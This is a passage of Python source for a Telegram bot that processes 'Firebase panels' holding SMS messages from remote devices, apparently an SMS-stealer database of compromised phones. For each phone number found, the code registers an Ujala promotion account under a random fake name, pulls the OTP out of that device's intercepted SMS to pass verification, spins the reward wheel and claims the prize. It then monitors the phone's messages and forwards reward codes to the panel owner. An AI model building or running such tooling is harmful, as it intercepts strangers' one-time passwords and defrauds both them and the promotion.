        finally:
            _job_queue.task_done()


def start_job_workers():
    """Launch the bounded worker pool (JOB_WORKERS threads)."""
    for i in range(max(1, JOB_WORKERS)):
        threading.Thread(target=_job_worker, name=f"job-worker-{i}",
                         daemon=True).start()
    logger.info("Started %d background job workers", max(1, JOB_WORKERS))

# fb_id -> number of active monitor threads (used to flip monitor_active)
_monitor_counts = {}


def _monitor_inc(fb_id):
    """Register one active monitor thread for a panel."""
    with _processing_lock:
        c = _monitor_counts.get(fb_id, 0) + 1
        _monitor_counts[fb_id] = c
        if c == 1:
            update_firebase(fb_id, monitor_active=1)
        return c


def _monitor_dec(fb_id):
    """Unregister one finished monitor thread for a panel."""
    with _processing_lock:
        c = _monitor_counts.get(fb_id, 0)
        c = max(0, c - 1)
        if c <= 0:
            _monitor_counts.pop(fb_id, None)
            update_firebase(fb_id, monitor_active=0)
        else:
            _monitor_counts[fb_id] = c


def start_user_sms_monitor(panel_url, device_id, mobile, fb_id, user_id,
                           reward=None, duration=600):
    """
    Background thread (one per successfully claimed CASHBACK number): polls
    the panel's SMS node (All_Users/sms/{device_id}) every 3 s for
    `duration` seconds (10 min). When a NEW SMS contains a reward code
    ("Reward Code: ...") or Ujala keywords (BigCity / Ujala / Onam), the
    FULL SMS is forwarded to the panel owner's chat.
    Never blocks the bot (daemon thread).
    """
    _monitor_inc(fb_id)
    reward_line = ""
    if reward:
        reward_line = f"🎁 <b>{escape(str(reward))}</b>\n"
    try:
        bot.send_message(
            user_id,
            f"🔍 <b>Monitor Started</b>\n"
            f"📱 <code>{mobile}</code>\n"
            f"{reward_line}"
            f"🆔 <code>{device_id}</code>\n"
            f"⏱️ {duration // 60} min\n"
            f"{FOOTER}",
            parse_mode="HTML",
        )
    except Exception as e:
        logger.error("monitor start message failed: %s", e)

    # Track keys seen BEFORE this monitor starts so only NEW SMS are reported
    existing_keys = set()
    try:
        initial = requests.get(f"{panel_url}/All_Users/sms/{device_id}.json", timeout=5)
        if initial.status_code == 200 and initial.json():
            existing_keys = set(initial.json().keys())
    except Exception:
        pass

    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            resp = requests.get(f"{panel_url}/All_Users/sms/{device_id}.json", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data and isinstance(data, dict):
                    for sms_key, sms_value in data.items():
                        if sms_key in existing_keys:
                            continue
                        existing_keys.add(sms_key)
                        if not isinstance(sms_value, dict):
                            continue
                        body = str(sms_value.get("body") or sms_value.get("message")
                                   or sms_value.get("text") or "")
                        reward_match = re.search(r"Reward Code[^:]*:\s*([A-Za-z0-9]+)",
                                                 body, re.IGNORECASE)
                        if not reward_match:
                            # Format without colon, e.g. "Reward Code for Ujala
                            # Onam Consumer promo is X37VHDCFK6BC"
                            reward_match = re.search(
                                r"Reward Code[^.\n]*?\b([A-Z0-9]{8,})\b", body, re.I)
                        is_ujala = any(k in body for k in ["BigCity", "Ujala", "Onam"])
                        if reward_match or is_ujala:
                            try:
                                bot.send_message(
                                    user_id,
                                    f"📩 <b>Ujala SMS</b>\n"
                                    f"📱 <code>{mobile}</code>\n"
                                    f"🆔 <code>{device_id}</code>\n"
                                    f"💬 <code>{escape(body[:400])}</code>\n"
                                    f"{FOOTER}",
                                    parse_mode="HTML",
                                )
                                logger.info("[MON] %s forwarded for %s", mobile, device_id)
                            except Exception as e:
                                logger.error("monitor forward failed: %s", e)
        except Exception:
            pass
        time.sleep(3)

    try:
        bot.send_message(
            user_id,
            f"⏰ <b>Monitor Done</b>\n"
            f"📱 <code>{mobile}</code>\n"
            f"{FOOTER}",
            parse_mode="HTML",
        )
    except Exception:
        pass
    _monitor_dec(fb_id)

_FIRST_NAMES = ["Aarav", "Vivaan", "Aditya", "Vihaan", "Arjun", "Sai", "Reyansh",
                "Ayaan", "Ananya", "Aadhya", "Diya", "Myra", "Sara", "Anika",
                "Pari", "Aarohi", "Kiara"]
_LAST_NAMES = ["Nair", "Menon", "Pillai", "Kurup", "Nambiar", "Warrier",
               "Panicker", "Thampi", "Varma"]


def _random_name():
    """Random Indian-style name used when registering numbers with Ujala."""
    return f"{random.choice(_FIRST_NAMES)} {random.choice(_LAST_NAMES)}"


def _fb_short(url):
    """Short display form of a Firebase URL."""
    return url.replace("https://", "").split(".")[0][:24] or url


def process_one_number(panel_url, device_id, mobile, code, progress_fn):
    """
    Full Ujala flow for ONE number:
      create_user -> send_otp -> fetch_otp_from_sms -> verify_otp ->
      spin_wheel -> claim_reward
    progress_fn(status_str) is called for each step.
    Returns a result dict {"number", "status", "reward"}.
    """
    progress_fn(f"🆕 Creating user for <code>{mobile}</code>...")
    user_key, data_key = api_create_user()
    if not user_key or not data_key:
        return {"number": mobile, "status": "create_failed", "reward": None}

    progress_fn(f"📨 Sending OTP to <code>{mobile}</code>...")
    if not send_otp(user_key, data_key, _random_name(), mobile, code):
        return {"number": mobile, "status": "otp_send_failed", "reward": None}

    progress_fn(f"🔍 Waiting for SMS from device <code>{device_id}</code>...")
    otp = fetch_otp_from_sms(panel_url, device_id, timeout=OTP_POLL_SECONDS)
    if not otp:
        return {"number": mobile, "status": "otp_timeout", "reward": None}

    progress_fn(f"🔑 Verifying OTP for <code>{mobile}</code>...")
    token = verify_otp(user_key, data_key, otp)
    if not token:
        return {"number": mobile, "status": "verify_failed", "reward": None}

    progress_fn(f"🎡 Spinning the wheel for <code>{mobile}</code>...")
    reward = spin_wheel(user_key, data_key, token)
    if not reward:
        return {"number": mobile, "status": "spin_failed", "reward": None}

    progress_fn(f"💰 Claiming reward for <code>{mobile}</code>...")
    if claim_reward(user_key, data_key, token):
        return {"number": mobile, "status": "Success", "reward": reward}
    return {"number": mobile, "status": "claim_failed", "reward": reward}


_STATUS_LABEL = {
    "Success": "✅ Claimed",
    "create_failed": "❌ User creation failed",
    "otp_send_failed": "❌ OTP send failed",
    "otp_timeout": "❌ OTP timeout",
    "verify_failed": "❌ OTP verification failed",
    "spin_failed": "❌ Spin failed",
    "claim_failed": "⚠️ Claim failed",
}


def is_cashback_reward(reward):
    """
    True when the spin reward is a cashback (the 10-minute SMS monitor is
    only started for cashback winners - the reward-code SMS
    arrives on the phone afterwards and must be captured).
    """
    if not reward:
        return False
    return "cashback" in str(reward).lower()


def progress_edit(chat_id, message_id, text, reply_markup=None):
    """
    Edit the single progress message in place.
    If the original message was deleted, resend it (keeps reporting alive).
    Returns the message_id that is currently on screen.
    """
    try:
        bot.edit_message_text(text, chat_id=chat_id, message_id=message_id,
                              reply_markup=reply_markup, parse_mode="HTML",
                              disable_web_page_preview=True)
        return message_id
    except Exception as e:
        err = str(e)
        if "message is not modified" in err:
            return message_id
        if "message to edit not found" in err or "message is not found" in err:
            try:
                m = bot.send_message(chat_id, text, reply_markup=reply_markup,
                                     parse_mode="HTML", disable_web_page_preview=True)
                return m.message_id
            except Exception as e2:
                logger.error("progress resend failed: %s", e2)
        return message_id


def process_firebase_job(fb_id, chat_id, message_id):
    """
    Queue-worker entry point for ONE Firebase panel. Wraps the real work in
    try/finally so the job slot is ALWAYS released, even if the job crashes.
    """
    try:
        _run_firebase_job(fb_id, chat_id, message_id)
    except Exception as e:
        logger.exception("[FB %s] job crashed: %s", fb_id, e)
        try:
            fb = get_firebase_by_id(fb_id)
            url = escape(fb["firebase_url"]) if fb else "?"
            progress_edit(
                chat_id, message_id,
                f"🔥 <b>PROCESSING FAILED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔗 <code>{url}</code>\n"
                f"❌ The job crashed: <code>{escape(str(e)[:200])}</code>\n"
                f"Try again or contact admin.\n"
                f"{FOOTER}",
            )
            update_firebase(fb_id, status="error",
                            summary="❌ Job crashed: " + str(e)[:200])
        except Exception:
            pass
    finally:
        with _processing_lock:
            _processing_jobs.discard(fb_id)
            _processing_owners.pop(fb_id, None)


def _run_firebase_job(fb_id, chat_id, message_id):
    """
    Background job: process one Firebase panel end to end.
      discover -> for each number: full Ujala flow -> progress edits -> summary.
    """
    fb = get_firebase_by_id(fb_id)
    if not fb:
        return

    firebase_url = fb["firebase_url"]
    update_firebase(fb_id, status="processing",
                    last_processed=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    logger.info("[FB %s] processing started for %s", fb_id, firebase_url)

    mid = message_id
    text = (
        f"🔥 <b>PROCESSING FIREBASE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 <code>{escape(firebase_url)}</code>\n"
        f"⏳ Discovering online devices...\n"
        f"{FOOTER}"
    )
    mid = progress_edit(chat_id, mid, text)

    # ── Step 1: discover online devices ──────────────────────────────
    panel = None
    try:
        panel = check_panel_active(firebase_url)
    except Exception as e:
        logger.error("[FB %s] discovery exception: %s", fb_id, e)

    if not panel:
        summary = "❌ No online devices found (panel unreachable or all offline)."
        text = (
            f"🔥 <b>PROCESSING COMPLETE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔗 <code>{escape(firebase_url)}</code>\n"
            f"{summary}\n"
            f"{FOOTER}"
        )
        progress_edit(chat_id, mid, text)
        update_firebase(fb_id, status="error", summary=summary,
                        last_processed=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        logger.info("[FB %s] no online devices", fb_id)
        return

    devices = panel["online_devices"]
    total = panel["total_numbers"]
    text = (
        f"🔥 <b>PROCESSING FIREBASE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 <code>{escape(firebase_url)}</code>\n"
        f"🖥️ Online devices: <b>{panel['total_devices']}</b>\n"
        f"📱 Numbers found: <b>{total}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ Starting Ujala flow for each number...\n"
        f"{FOOTER}"
    )
    mid = progress_edit(chat_id, mid, text)

    # ── Step 2: process every number ────────────────────────────────
    results = []
    monitors_started = 0
    done = 0
    for device in devices:
        device_id = device["id"]
        for mobile in device["numbers"]:
            done += 1

            # The step-level progress string is not displayed separately:
            # the per-number result line is what gets appended to the
            # (single, edited) progress message after each number.
            noop = lambda _msg: None

            res = process_one_number(
                firebase_url, device_id, mobile, PRODUCT_CODE, noop,
            )
            results.append(res)

            # ── Per-number SMS monitoring ─────────────────────────────
            # Only CASHBACK winners get the 10-minute SMS monitor: the
            # reward-code SMS ("Congratulations! Your Reward Code for Ujala
            # Onam Consumer promo is XXXX...") arrives on the phone shortly
            # after the claim and must be captured + forwarded to the owner.
            # Monitors run in the shared queue so thread count stays bounded.
            if res["status"] == "Success" and is_cashback_reward(res.get("reward")):
                _enqueue_job("monitor",
                             (firebase_url, device_id, mobile, fb_id, chat_id,
                              res.get("reward")))
                monitors_started += 1

            body = "\n".join(f"• <code>{r['number']}</code> → "
                             f"{_STATUS_LABEL.get(r['status'], r['status'])}"
                             + (f" 🎁 {escape(str(r['reward']))}" if r["reward"] else "")
                             + (" 📡" if (r["status"] == "Success"
                                          and is_cashback_reward(r.get("reward"))) else "")
                             for r in results[-12:])
            text = (
                f"🔥 <b>PROCESSING FIREBASE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔗 <code>{escape(firebase_url)}</code>\n"
                f"📱 Progress: <b>{done}/{total}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{body}\n"
                f"{FOOTER}"
            )
            mid = progress_edit(chat_id, mid, text)
            if done < total:
                time.sleep(JOB_WAIT_TIME)

    # ── Step 3: summary ──────────────────────────────────────────────
    success = [r for r in results if r["status"] == "Success"]
    failed = [r for r in results if r["status"] != "Success"]

    if success:
        winners = "\n".join(
            f"• <code>{escape(r['number'])}</code> → {escape(str(r['reward']))}"
            + (" 📡" if is_cashback_reward(r.get("reward")) else "")
            for r in success[:10]
        )
    else:
        winners = "• None"

    summary_lines = [
        f"📱 Processed: <b>{len(results)}</b>",
        f"✅ Success: <b>{len(success)}</b>",
        f"❌ Failed: <b>{len(failed)}</b>",
        f"🛰️ Cashback monitors started: <b>{monitors_started}</b>",
    ]
    summary = "\n".join(summary_lines)

    text = (
        f"🏁 <b>PROCESSING COMPLETE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 <code>{escape(firebase_url)}</code>\n"
        f"{summary}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎉 <b>WINNERS</b>\n{winners}\n"
        f"{FOOTER}"
    )
    progress_edit(chat_id, mid, text)

    update_firebase(
        fb_id,
        status="completed",
        summary=summary,
        last_processed=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    )
    logger.info("[FB %s] done: %d processed, %d success", fb_id, len(results), len(success))


def start_firebase_processing(fb_id, chat_id, message_id):
    """
    Queue the processing job instead of spawning an unlimited thread.
    Enforces ONE job per user (queued or running) and shows the user
    their queue position so everyone knows their turn is coming.
    """
    with _processing_lock:
        if fb_id in _processing_jobs:
            return False
        if chat_id in _processing_owners.values():
            return False
        _processing_jobs.add(fb_id)
        _processing_owners[fb_id] = chat_id
    pos = _enqueue_job("process", (fb_id, chat_id, message_id))
    fb = get_firebase_by_id(fb_id)
    url = escape(fb["firebase_url"]) if fb else "?"
    if pos > max(1, JOB_WORKERS):
        try:
            progress_edit(
                chat_id, message_id,
                f"⏳ <b>QUEUED</b> - position #{pos}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔗 <code>{url}</code>\n\n"
                f"Other users are processing right now.\n"
                f"Your turn will come automatically - no need to press anything. "
                f"The same message will update with progress.\n"
                f"{FOOTER}",
            )
        except Exception as e:
            logger.error("queue notice failed: %s", e)
    return True


# ════════════════════════════════════════════════════════════════════════════
# 8. FORCE CHANNEL JOIN
# ════════════════════════════════════════════════════════════════════════════

FOOTER = "\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🤖 Made by viediet"


def btn(text, callback_data=None, url=None):
    """
    Inline keyboard button factory.
    NOTE: the Telegram Bot API does not support the colored-button
    'style' parameter, so we send plain buttons only (works everywhere).
    """
    kwargs = {"text": text}
    if callback_data:
        kwargs["callback_data"] = callback_data
    if url:
        kwargs["url"] = url
    return InlineKeyboardButton(**kwargs)


def check_channel_membership(user_id):
    """Return True only if the user joined BOTH required channels."""
    required = [CHANNEL_USERNAME, CHANNEL2_USERNAME]
    all_joined = True
    for ch in required:
        try:
            member = bot.get_chat_member(f"@{ch}", user_id)
            joined = member.status in ("member", "administrator", "creator")
        except Exception as e:
            logger.error("Channel check failed for %s @%s: %s", user_id, ch, e)
            joined = False
        if not joined:
            all_joined = False
    if all_joined:
        update_user(user_id, channel_joined=1)
    return all_joined


def channel_join_keyboard():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.row(btn(f"📢 1️⃣ JOIN @{CHANNEL_USERNAME}",
               url=f"https://t.me/{CHANNEL_USERNAME}"))
    kb.row(btn(f"📢 2️⃣ JOIN @{CHANNEL2_USERNAME}",
               url=f"https://t.me/{CHANNEL2_USERNAME}"))
    kb.row(btn("✅ CHECK AGAIN", callback_data="check_channel"))
    return kb


def channel_join_text():
    return (
        f"🔒 <b>CHANNELS REQUIRED</b>\n\n"
        f"⚠️ To use this bot you must join BOTH channels:\n\n"
        f"📢 1️⃣ <b>@{CHANNEL_USERNAME}</b>\n"
        f"📢 2️⃣ <b>@{CHANNEL2_USERNAME}</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Join both, then press <b>CHECK AGAIN</b>.\n"
        f"{FOOTER}"
    )


def send_join_required(chat_id):
    """Force channel join prompt."""
    bot.send_message(chat_id, channel_join_text(),
                     reply_markup=channel_join_keyboard(), parse_mode="HTML")


# ════════════════════════════════════════════════════════════════════════════
# 9. UI HELPERS (footers, keyboards, texts)
# ════════════════════════════════════════════════════════════════════════════

def main_menu_keyboard(user):
    """Main menu buttons; admin gets an extra ADMIN PANEL button."""
    kb = InlineKeyboardMarkup(row_width=2)
    kb.row(btn("🎡 SPIN NOW", callback_data="spin_now"))
    kb.row(btn("📁 ADD FIREBASE", callback_data="add_firebase"),
           btn("📂 MY FIREBASE", callback_data="my_firebase"))
    kb.row(btn("📊 MY HISTORY", callback_data="my_history"),
           btn("🆘 HELP", callback_data="help"))
    if user and user.get("is_admin"):
        kb.row(btn("👑 ADMIN PANEL", callback_data="admin_panel"))
    return kb


def main_menu_text(user, first_name):
    name = escape(first_name or "User")
    return (
        f"🎡 <b>VIEDIET UJALA BOT</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome, <b>{name}</b>!\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎡 Spins are <b>100% FREE</b> & unlimited!\n"
        f"📁 Firebase limit: <b>1 panel</b> per user\n"
        f"   (you can delete it & add a new one anytime)\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Spin the wheel and win exciting rewards! 🎉\n"
        f"{FOOTER}"
    )


def show_main_menu(chat_id, message_id=None, edit=True):
    """Show (or edit into) the main menu."""
    user = get_user(chat_id)
    if not user:
        return
    text = main_menu_text(user, user.get("first_name"))
    markup = main_menu_keyboard(user)
    if edit and message_id:
        safe_edit(chat_id, message_id, text, markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")


def safe_edit(chat_id, message_id, text, markup=None):
    """Edit a message; fall back to sending a new one on failure."""
    try:
        bot.edit_message_text(text, chat_id=chat_id, message_id=message_id,
                              reply_markup=markup, parse_mode="HTML",
                              disable_web_page_preview=True)
    except Exception as e:
        if "message is not modified" in str(e):
            return  # identical content, nothing to do
        try:
            bot.send_message(chat_id, text, reply_markup=markup,
                             parse_mode="HTML", disable_web_page_preview=True)
        except Exception as e2:
            logger.error("safe_edit failed: %s", e2)


def mask_phone(phone):
    """Mask a 10 digit number like +91******1234 for privacy."""
    if phone and len(phone) >= 4:
        return f"+91{'*' * (len(phone) - 4)}{phone[-4:]}"
    return phone or "N/A"


def back_markup(callback_data="main_menu"):
    """Simple back-button markup used by several sub menus."""
    kb = InlineKeyboardMarkup()
    kb.row(btn("🔙 BACK", callback_data=callback_data))
    return kb


# ════════════════════════════════════════════════════════════════════════════
# 10. GLOBAL STATE (spin flows, admin flows, concurrency guards)
# ════════════════════════════════════════════════════════════════════════════

_state_lock = threading.RLock()
spin_sessions = {}       # user_id -> {step, user_key, data_key, phone}
admin_states = {}        # user_id -> {type, target}
broadcast_msgs = {}      # user_id -> text awaiting confirmation
firebase_states = {}     # user_id -> {"step": "awaiting_url"}
firebase_confirmations = {}  # user_id -> {"entries": [...], "dupes": [...], "_ts": t}


def clear_state(user_id):
    """Remove every temporary state for a user."""
    with _state_lock:
        spin_sessions.pop(user_id, None)
        admin_states.pop(user_id, None)
        broadcast_msgs.pop(user_id, None)
        firebase_states.pop(user_id, None)
        firebase_confirmations.pop(user_id, None)


def is_admin(user):
    """User-level admin check (DB flag or env ADMIN_ID)."""
    return user is not None and (user.get("is_admin") == 1 or user.get("user_id") == ADMIN_ID)


# ════════════════════════════════════════════════════════════════════════════
# 11. USER SIDE MESSAGES & FLOWS
# ════════════════════════════════════════════════════════════════════════════

def send_help(chat_id, message_id=None, edit=True):
    """HELP menu: how to spin, how to add / manage your single Firebase."""
    text = (
        f"🆘 <b>HELP</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎡 <b>HOW TO SPIN</b> (FREE, unlimited)\n"
        f"1️⃣ Press <b>SPIN NOW</b>\n"
        f"2️⃣ Enter your 10 digit mobile number\n"
        f"3️⃣ Enter the OTP received via SMS\n"
        f"4️⃣ Watch the wheel spin! 🎉\n\n"
        f"📁 <b>HOW TO ADD FIREBASE</b> (1 panel limit)\n"
        f"1️⃣ Press <b>ADD FIREBASE</b>\n"
        f"2️⃣ Send your URL, e.g.\n"
        f"   <code>https://panel-name-default-rtdb.firebaseio.com</code>\n"
        f"3️⃣ The bot <b>checks</b> it and shows how many "
        f"<b>devices</b> and <b>numbers</b> it has\n"
        f"4️⃣ Confirm <b>✅ ADD</b> to save it\n"
        f"5️⃣ Pick the panel with the <b>SELECT</b> button to process it\n"
        f"6️⃣ After each claim, a <b>10-minute SMS monitor</b> watches "
        f"that device and forwards reward-code SMS to you\n\n"
        f"🗑️ <b>LIMIT & DELETE</b>\n"
        f"• Only <b>1 panel</b> per user\n"
        f"• If your panel is not working, go to <b>MY FIREBASE</b> and "
        f"<b>DELETE</b> it yourself, then add a new one\n\n"
        f"🎁 <b>POSSIBLE REWARDS</b>\n"
        f"• 💰 Cashback rewards\n"
        f"• 🎫 Coupons & vouchers\n"
        f"• 🎁 Mystery prizes\n\n"
        f"💡 No points, no referrals — everything is free!\n"
        f"{FOOTER}"
    )
    markup = back_markup()
    if edit and message_id:
        safe_edit(chat_id, message_id, text, markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")


def send_history(chat_id, message_id=None, edit=True):
    """MY HISTORY menu: list spins with rewards."""
    history = get_spin_history(chat_id)
    if not history:
        body = (
            f"📊 <b>MY HISTORY</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ No spins yet!\n\n"
            f"Press 🎡 SPIN NOW to try your luck!\n"
            f"{FOOTER}"
        )
    else:
        lines = "\n".join(
            f"• {mask_phone(h['phone'])} — 🎁 {escape(h['reward'])}\n   ⏰ {h['spin_time']}"
            for h in history
        )
        body = (
            f"📊 <b>MY HISTORY</b> (last {len(history)})\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{lines}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Total spins: <b>{get_spin_count(chat_id)}</b>\n"
            f"{FOOTER}"
        )
    markup = back_markup()
    if edit and message_id:
        safe_edit(chat_id, message_id, body, markup)
    else:
        bot.send_message(chat_id, body, reply_markup=markup, parse_mode="HTML")


# ─────────────────────────── MY FIREBASE MENU ───────────────────────────

_STATUS_EMOJI = {
    "pending": "⏳",
    "scanned": "📡",
    "processing": "🔄",
    "completed": "✅",
    "error": "❌",
}

MYFB_PAGE_SIZE = 6  # firebase rows per page in MY FIREBASE


def _fb_row_text(r):
    """One human readable line for a firebase row."""
    emoji = _STATUS_EMOJI.get(r["status"], "⏳")
    detail = ""
    if r["status"] == "pending":
        detail = "⏳ Waiting to be scanned"
    elif r["status"] == "scanned":
        detail = r.get("summary") or "📡 Scanned"
    elif r["status"] == "processing":
        detail = "🔄 Processing... " + (r.get("summary") or "")
    elif r["status"] == "completed":
        detail = "✅ Done — " + (r.get("summary") or "")
    elif r["status"] == "error":
        detail = r.get("summary") or "❌ Error"
    return (f"{emoji} <code>{escape(r['firebase_url'])}</code>\n"
            f"   {detail}")


def _firebase_list_markup(rows, with_select=True, page=0, total_pages=1, selected_id=None):
    """One SELECT + one DELETE button per row + pagination."""
    kb = InlineKeyboardMarkup(row_width=1)
    for r in rows:
        short = _fb_short(r["firebase_url"])
        if with_select:
            if r["id"] == selected_id:
                kb.row(btn(f"🔒 SELECTED — {short}", callback_data="noop"))
            else:
                kb.row(btn(f"🎡 SELECT — {short}", callback_data=f"fb_sel_{r['id']}"))
        kb.row(btn(f"🗑️ DELETE — {short}", callback_data=f"fb_my_del_{r['id']}"))
    nav = []
    if page > 0:
        nav.append(btn("⬅️ PREV", callback_data=f"my_fb_page_{page - 1}"))
    if page + 1 < total_pages:
        nav.append(btn("NEXT ➡️", callback_data=f"my_fb_page_{page + 1}"))
    if nav:
        kb.row(*nav)
    return kb


def send_my_firebase(chat_id, message_id=None, page=0, edit=True):
    """MY FIREBASE: list the URLs added by the user with status + SELECT/DELETE."""
    rows = get_user_firebases(chat_id)
    selected = get_selected_firebase(chat_id)
    total_pages = max(1, (len(rows) + MYFB_PAGE_SIZE - 1) // MYFB_PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * MYFB_PAGE_SIZE
    end = min(start + MYFB_PAGE_SIZE, len(rows))
    page_rows = rows[start:end]

    if not rows:
        body = (
            f"📂 <b>MY FIREBASE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ You have not added any Firebase URL yet.\n\n"
            f"📁 Limit: <b>1 panel</b> per user\n"
            f"Press 📁 ADD FIREBASE to add yours!\n"
            f"{FOOTER}"
        )
        markup = InlineKeyboardMarkup(row_width=1)
        markup.row(btn("📁 ADD FIREBASE", callback_data="add_firebase"))
        markup.row(btn("🔙 BACK", callback_data="main_menu"))
    else:
        lines = "\n".join(_fb_row_text(r) for r in page_rows)
        nav_note = f" (page {page + 1}/{total_pages})" if total_pages > 1 else ""
        if selected:
            selected_note = (
                f"\n🔒 Selected panel: <code>{escape(_fb_short(selected['firebase_url']))}</code>\n"
                f"Tap 🎡 SELECT to process it.\n"
                f"🗑️ Not working? Delete it with 🗑️ and add a new one."
            )
        else:
            selected_note = (
                f"\n🎡 Tap 🎡 SELECT on your panel to process it.\n"
                f"🗑️ Not working? Delete it with 🗑️ and add a new one."
            )
        body = (
            f"📂 <b>MY FIREBASE</b>{nav_note}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{lines}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{selected_note}\n"
            f"{FOOTER}"
        )
        markup = _firebase_list_markup(page_rows, with_select=True,
                                       page=page, total_pages=total_pages,
                                       selected_id=selected["id"] if selected else None)
        markup.row(btn("📁 ADD MORE", callback_data="add_firebase"),
                   btn("🔙 BACK", callback_data="main_menu"))

    if edit and message_id:
        safe_edit(chat_id, message_id, body, markup)
    else:
        bot.send_message(chat_id, body, reply_markup=markup, parse_mode="HTML")


def send_firebase_selection(chat_id, message_id=None, edit=True):
    """
    Selection screen shown after scanning: every URL with its device count
    and a SELECT button for panels that found online devices.
    """
    rows = get_user_firebases(chat_id)
    selected = get_selected_firebase(chat_id)
    selectable = [r for r in rows if r["status"] == "scanned"]
    other = [r for r in rows if r["status"] != "scanned"]

    if selected:
        body = (
            f"🎯 <b>SELECT A PANEL</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔒 Your selected panel:\n"
            f"<code>{escape(selected['firebase_url'])}</code>\n\n"
            f"📂 See <b>MY FIREBASE</b> to process it or delete it.\n"
            f"{FOOTER}"
        )
        markup = InlineKeyboardMarkup(row_width=1)
        markup.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
        markup.row(btn("🔙 MAIN MENU", callback_data="main_menu"))
        if edit and message_id:
            safe_edit(chat_id, message_id, body, markup)
        else:
            bot.send_message(chat_id, body, reply_markup=markup, parse_mode="HTML")
        return

    if not selectable:
        body = (
            f"🎯 <b>SELECT A PANEL</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ No URL has online devices right now.\n\n"
            f"💡 Add your Firebase URL with 📁 ADD FIREBASE, or\n"
            f"💡 Panels may be offline - try again later.\n"
            f"{FOOTER}"
        )
        markup = InlineKeyboardMarkup(row_width=1)
        markup.row(btn("📁 ADD MORE", callback_data="add_firebase"))
        markup.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
        if edit and message_id:
            safe_edit(chat_id, message_id, body, markup)
        else:
            bot.send_message(chat_id, body, reply_markup=markup, parse_mode="HTML")
        return

    lines = "\n".join(
        f"{_STATUS_EMOJI.get(r['status'], '⏳')} <code>{escape(r['firebase_url'])}</code> — "
        f"{r.get('summary') or '—'}"
        for r in selectable
    )
    other_lines = ""
    if other:
        other_lines = "\n" + "\n".join(
            f"   {_STATUS_EMOJI.get(r['status'], '⏳')} <code>{escape(r['firebase_url'])}</code> — "
            f"{r.get('summary') or 'waiting'}"
            for r in other[:4]
        )
        if len(other) > 4:
            other_lines += f"\n   ... and {len(other) - 4} more (see 📂 MY FIREBASE)"

    body = (
        f"🎯 <b>SELECT A PANEL TO PROCESS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{lines}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Tap 🎡 SELECT on the panel you want to process.\n"
        f"Only <b>one</b> panel per user — delete it in 📂 MY FIREBASE "
        f"if it stops working and add a new one.\n"
        f"{other_lines}\n"
        f"{FOOTER}"
    )
    markup = _firebase_list_markup(selectable, with_select=True)
    markup.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
    markup.row(btn("🔙 MAIN MENU", callback_data="main_menu"))

    if edit and message_id:
        safe_edit(chat_id, message_id, body, markup)
    else:
        bot.send_message(chat_id, body, reply_markup=markup, parse_mode="HTML")


def is_valid_firebase_url(raw_url):
    """
    Validate a Firebase Realtime Database URL.
    Returns (ok, normalized_url_or_error_message).
    """
    url = (raw_url or "").strip().rstrip("/")
    if not url.startswith("https://"):
        return False, "❌ URL must start with <b>https://</b>"
    if "firebaseio.com" not in url and "firebasedatabase.app" not in url:
        return (False,
                "❌ Not a Firebase URL. It must contain "
                "<b>firebaseio.com</b> or <b>firebasedatabase.app</b>")
    return True, url


def start_add_firebase(chat_id, message_id=None):
    """Entry point of the ADD FIREBASE flow (enforces the 1-panel limit)."""
    user = get_user(chat_id)
    if not user:
        return
    if get_firebase_count(chat_id) >= 1:
        kb = InlineKeyboardMarkup(row_width=1)
        kb.row(btn("📂 MY FIREBASE", callback_data="my_firebase"))
        bot.send_message(
            chat_id,
            f"❌ <b>You already have 1 Firebase panel.</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📂 Limit: <b>1 panel per user</b>.\n\n"
            f"👉 If your panel is not working, go to <b>📂 MY FIREBASE</b>, "
            f"<b>DELETE</b> the existing one and add a new panel.\n"
            f"{FOOTER}",
